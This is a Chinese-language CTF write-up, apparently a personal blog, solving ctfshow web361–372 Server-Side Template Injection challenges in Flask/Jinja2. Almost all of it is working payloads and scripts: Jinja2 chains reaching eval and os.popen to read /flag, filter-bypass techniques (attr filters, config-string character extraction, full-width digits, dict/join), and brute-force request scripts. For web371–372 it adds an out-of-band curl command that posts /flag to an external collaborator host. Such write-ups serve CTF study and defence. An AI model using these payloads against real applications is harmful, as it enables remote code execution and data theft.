---
title: "ctfshow SSTI"
description: "ctfshow web361–372 SSTI 刷题记录。"
publishDate: "2026-02-26T14:54:26"
tags:
  - "ctf"
  - "web"
heroImage: { src: './sea-breeze.jpg', color: '#5D6D7E' }
language: '简中'
draft: false
---

## web361

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('cat /flag').read()")}}
```

## web362

说是过滤了数字2、3，不能使用`wrap_close`，但我们上题没用`wrap_close`，所以361的payload依旧可行，或者也可以用算数表达式绕过对数字的过滤，如：

```text
__subclasses__()[11*11%2b+11]
```

## web363

使用`?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[%27__builtins__%27]}}`推进到`[%27__builtins__%27]`时返回`:(`，发现是单双引号被过滤，此时转用`request`对象

```python
().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.args.key]
```

1. **`request` 对象**：这是 Flask 框架提供的一个全局对象，包含了当前 HTTP 请求的所有信息。
2. **`.args`**：这是 request 对象的一个属性（类似于字典），存储了 URL 中问号后面的所有参数。
3. **`.key`**（或 `['key']`）：这会从 URL 参数中提取出 key 对应的值。

最后的payload：

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.args.a][request.args.b](request.args.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()
```

## web364

过滤了`args`，可以用`request.values`或者`request.cookie`

```text
?name={{().__class__.__base__.__subclasses__()[185].__init__.__globals__[request.values.a][request.values.b](request.values.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()
```

## web365

过滤了方括号，可以用`__getitem__()`和`.get()`或`pop()`

`__getitem__()`适用于`list`，`dict`，`string`

列表：`list[0]` → `list.__getitem__(0)`

字典：`dict['key']` → `dict.__getitem__('key')`

`get()`适用于`dict`

```python
globals().get('__builtins__')
```

`pop`适用于`list`，是指移除并返回指定位置的元素

```text
?name={{().__class__.__base__.__subclasses__().__getitem__(request.values.d|int).__init__.__globals__.get(request.values.a).get(request.values.b)(request.values.c)}}&a=__builtins__&b=eval&c=__import__('os').popen('cat /flag').read()&d=185
```

## web366

下划线被过滤，用`attr`过滤器+`request`

```text
?name={{()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(request.values.f|int)|attr(request.values.g)|attr(request.values.h)|attr(request.values.i)(request.values.j)|attr(request.values.i)(request.values.k)(request.values.l)}}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&f=185&g=__init__&h=__globals__&i=get&j=__builtins__&k=eval&l=__import__('os').popen('cat /flag').read()
```

## web367

好像是过滤了`os`，但对366的payload无影响，用上题的直接过

## web368

在`{{…}}`中过滤了`request`，可以用`{%print(…)%}`代替

前者主要作用将括号内表达式计算结果输出到网页

后者则是用来控制模板的逻辑流

```text
?name={%print(()|attr(request.values.a)|attr(request.values.b)|attr(request.values.c)()|attr(request.values.d)(request.values.f|int)|attr(request.values.g)|attr(request.values.h)|attr(request.values.i)(request.values.j)|attr(request.values.i)(request.values.k)(request.values.l))%}&a=__class__&b=__base__&c=__subclasses__&d=__getitem__&f=185&g=__init__&h=__globals__&i=get&j=__builtins__&k=eval&l=__import__(%27os%27).popen(%27cat%20/flag%27).read()
```

## web369

`{%…%}`中过滤了`request`，`{{}}`，`os`，单双引号，下划线

使用`config|string|list`，把目标字符串一个个拼出来并用`~`连接，同时了解到可以使用`lipsum`从而省去前面对`builtins`一大串的构造链条，`lipsum`的`__globals__`字典通常直接包含`os`模块，因此可以直接使用`{{lipsum.__globals__.get('os').popen('cat /flag').read()}}`来节省一大段构造

写一个脚本来挖`config`

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://89eff3c8-d6bb-4c7e-8326-e02466997758.challenge.ctf.show/"
payload = "?name={{%print(config|string|list).pop({}).lower()%}}"
target = "__globals__"
result = ""

url = url + payload

for i in target:
    print(f"正在搜寻字符{i}")
    for j in range(0,1000):
        r = requests.get(url=url.format(j), verify=False)
        location = r.text.find("<h3>")
        word = r.text[location+4:location+5]
        if word == i.lower():
            print("(config|string|list).pop(%d).lower()  ==  %s" % (j, i))
            result += "(config|string|list).pop(%d).lower()~" % (j)
            break
print(result[:len(result) - 1])
```

```text
__globals__：//下划线被过滤
(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()
```

```text
get：
(config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower()
```

```text
os：//os被过滤
(config|string|list).pop(2).lower()~(config|string|list).pop(42).lower()
```

```text
popen：
(config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower()
```

```text
cat /flag：//单引号被过滤
(config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower()
```

```text
read:
(config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower()
```

虽然有`lipsum`来减少构造长度，但最后拼出来payload还是有1300个字符。。。：

```text
?name={%print(lipsum|attr((config|string|list).pop(74).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(6).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(33).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(42).lower()~(config|string|list).pop(74).lower()~(config|string|list).pop(74).lower())|attr((config|string|list).pop(6).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(23).lower())((config|string|list).pop(2).lower()~(config|string|list).pop(42).lower())|attr((config|string|list).pop(17).lower()~(config|string|list).pop(2).lower()~(config|string|list).pop(17).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(3).lower())((config|string|list).pop(1).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(23).lower()~(config|string|list).pop(7).lower()~(config|string|list).pop(279).lower()~(config|string|list).pop(4).lower()~(config|string|list).pop(41).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(6).lower())|attr((config|string|list).pop(18).lower()~(config|string|list).pop(10).lower()~(config|string|list).pop(40).lower()~(config|string|list).pop(20).lower())())%}
```

## web370

又多过滤了数字，不能直接用`pop`，但使用脚本通过`length`或`count`绕过数字后url会过长从而报错，所以好像得改用`set`来缩短payload，但也比较麻烦，不过了解到可以通过全角数字来绕过半角数字，这样就方便多了，只需要改一下脚本即可：

```python
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def to_full_width(n):
    half = "0123456789"
    full = "０１２３４５６７８９"
    table = str.maketrans(half, full)
    return str(n).translate(table)

url = "https://72e8d189-8213-4b7f-b172-639d5521837c.challenge.ctf.show/"
payload = "?name={{%print(config|string|list).pop({}).lower()%}}"
target = "__globals__"
result = ""

for i in target:
    print(f"正在搜寻字符{i}")
    for j in range(0,1000):
        full_n = to_full_width(j)
        target_url = url + payload.format(full_n)
        r = requests.get(target_url, verify=False)
        location = r.text.find("<h3>")
        word = r.text[location+4:location+5]
        if word == i.lower():
            print("(config|string|list).pop(%s).lower()  ==  %s" % (full_n, i))
            result += "(config|string|list).pop(%s).lower()~" % (full_n)
            break
print(result[:len(result) - 1])
```

最后的payload：

```text
?name={%print(lipsum|attr((config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(６).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(３３).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４２).lower()~(config|string|list).pop(７４).lower()~(config|string|list).pop(７４).lower())|attr((config|string|list).pop(６).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(２３).lower())((config|string|list).pop(２).lower()~(config|string|list).pop(４２).lower())|attr((config|string|list).pop(１７).lower()~(config|string|list).pop(２).lower()~(config|string|list).pop(１７).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(３).lower())((config|string|list).pop(１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(２３).lower()~(config|string|list).pop(７).lower()~(config|string|list).pop(２７９).lower()~(config|string|list).pop(４).lower()~(config|string|list).pop(４１).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(６).lower())|attr((config|string|list).pop(１８).lower()~(config|string|list).pop(１０).lower()~(config|string|list).pop(４０).lower()~(config|string|list).pop(２０).lower())())%}
```

## web371

过滤了`print`，无法回显，傻眼了，从网上了解到需要使用外带攻击，同时对于`__global__`的构造不需要太麻烦，使用`dict`+`join`拼接加上`set`可以大大缩短payload长度，这样只需要构造下划线即可，但貌似网上都是直接默认知道下划线在 `()|select|string|list).pop(24)`，似乎是前面几题了解到的，而后面对于过滤了单引号的执行命令来说，需要把整体都构造的，可以利用bp的collaborator工具完成外带攻击：

```bash
curl -X POST -F xx=@/flag http://738jcw7deln9uxgsurd06339a0gr4hs6.oastify.com
```

```text
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５５)%2bchr(５１)%2bchr(５６)%2bchr(１０６)%2bchr(９９)%2bchr(１１９)%2bchr(５５)%2bchr(１００)%2bchr(１０１)%2bchr(１０８)%2bchr(１１０)%2bchr(５７)%2bchr(１１７)%2bchr(１２０)%2bchr(１０３)%2bchr(１１５)%2bchr(１１７)%2bchr(１１４)%2bchr(１００)%2bchr(４８)%2bchr(５４)%2bchr(５１)%2bchr(５１)%2bchr(５７)%2bchr(９７)%2bchr(４８)%2bchr(１０３)%2bchr(１１４)%2bchr(５２)%2bchr(１０４)%2bchr(１１５)%2bchr(５４)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```

## web372

过滤了`count`，但前几题都用的全角数字，所以无影响，实在不行还可以用`length`

```text
?name=
{% set po=dict(po=a,p=a)|join%}
{% set a=(()|select|string|list)|attr(po)(２４)%}
{% set ini=(a,a,dict(init=a)|join,a,a)|join()%}
{% set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% set ohs=(dict(o=a,s=a)|join)%}
{% set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
{% set chr=x.chr%}
{% set cmd=chr(９９)%2bchr(１１７)%2bchr(１１４)%2bchr(１０８)%2bchr(３２)%2bchr(４５)%2bchr(８８)%2bchr(３２)%2bchr(８０)%2bchr(７９)%2bchr(８３)%2bchr(８４)%2bchr(３２)%2bchr(４５)%2bchr(７０)%2bchr(３２)%2bchr(１２０)%2bchr(１２０)%2bchr(６１)%2bchr(６４)%2bchr(４７)%2bchr(１０２)%2bchr(１０８)%2bchr(９７)%2bchr(１０３)%2bchr(３２)%2bchr(１０４)%2bchr(１１６)%2bchr(１１６)%2bchr(１１２)%2bchr(５８)%2bchr(４７)%2bchr(４７)%2bchr(５５)%2bchr(５１)%2bchr(５６)%2bchr(１０６)%2bchr(９９)%2bchr(１１９)%2bchr(５５)%2bchr(１００)%2bchr(１０１)%2bchr(１０８)%2bchr(１１０)%2bchr(５７)%2bchr(１１７)%2bchr(１２０)%2bchr(１０３)%2bchr(１１５)%2bchr(１１７)%2bchr(１１４)%2bchr(１００)%2bchr(４８)%2bchr(５４)%2bchr(５１)%2bchr(５１)%2bchr(５７)%2bchr(９７)%2bchr(４８)%2bchr(１０３)%2bchr(１１４)%2bchr(５２)%2bchr(１０４)%2bchr(１１５)%2bchr(５４)%2bchr(４６)%2bchr(１１１)%2bchr(９７)%2bchr(１１５)%2bchr(１１６)%2bchr(１０５)%2bchr(１０２)%2bchr(１２１)%2bchr(４６)%2bchr(９９)%2bchr(１１１)%2bchr(１０９)%}
{% if ((lipsum|attr(glo)).get(ohs).popen(cmd))%}
abc
{% endif %}
```
